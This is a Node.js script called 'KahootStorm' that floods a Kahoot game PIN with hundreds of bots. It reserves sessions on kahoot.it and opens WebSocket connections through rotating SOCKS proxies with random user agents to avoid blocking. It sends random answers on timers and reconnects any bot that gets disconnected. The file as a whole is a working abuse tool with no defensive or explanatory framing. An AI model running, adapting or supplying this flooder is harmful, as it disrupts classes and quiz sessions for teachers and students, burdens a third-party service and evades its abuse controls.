const WebSocket = require('ws');
const axios = require('axios');
const SocksProxyAgent = require('socks-proxy-agent');
const randomUA = require('random-useragent');

const config = {
  GAME_PIN: process.env.GAME_PIN || '585088',
  PROXY_LIST: process.env.PROXY_LIST?.split(',') || ['socks5://user:pass@1.1.1.1:1080'],
  BOT_COUNT: Number(process.env.BOTS) || 500,
  DELAY_MS: Number(process.env.DELAY) || 100
};

class KahootStorm {
  constructor() {
    this.bots = new Set();
    this.startFlood();
  }

  async createBot(id) {
    const agent = randomUA.getRandom();
    const proxy = config.PROXY_LIST[Math.floor(Math.random() * config.PROXY_LIST.length)];
    
    try {
      const { data: sessionData } = await axios.post(
        `https://kahoot.it/reserve/session/${config.GAME_PIN}`,
        {},
        { 
          httpsAgent: new SocksProxyAgent(proxy),
          headers: { 'User-Agent': agent }
        }
      );

      const ws = new WebSocket(`wss://kahoot.it/cometd/${config.GAME_PIN}/${sessionData.session}`, {
        agent: new SocksProxyAgent(proxy),
        headers: { 'User-Agent': agent }
      });

      ws.on('open', () => {
        this.bots.add(ws);
        this.sendAnswer(ws);
        console.log(`[+] Bot ${id} connected`);
      });

      ws.on('close', () => this.handleDisconnect(id, ws));
      
    } catch (error) {
      console.log(`[-] Bot ${id} failed: ${error.code}`);
    }
  }

  sendAnswer(ws) {
    setInterval(() => {
      const payload = [{
        channel: "/service/controller",
        data: {
          type: "message",
          gameid: config.GAME_PIN,
          content: JSON.stringify({
            choice: Math.floor(Math.random() * 4),
            meta: {
              lag: Math.random() * 1000,
              device: {
                userAgent: randomUA.getRandom(),
                screen: { width: 1920, height: 1080 }
              }
            }
          })
        }
      }];
      ws.send(JSON.stringify(payload));
    }, Math.random() * 5000 + 2000);
  }

  handleDisconnect(id, ws) {
    this.bots.delete(ws);
    setTimeout(() => this.createBot(id), 5000);
  }

  startFlood() {
    for (let i = 0; i < config.BOT_COUNT; i++) {
      setTimeout(() => this.createBot(i), i * config.DELAY_MS);
    }
  }
}

new KahootStorm();
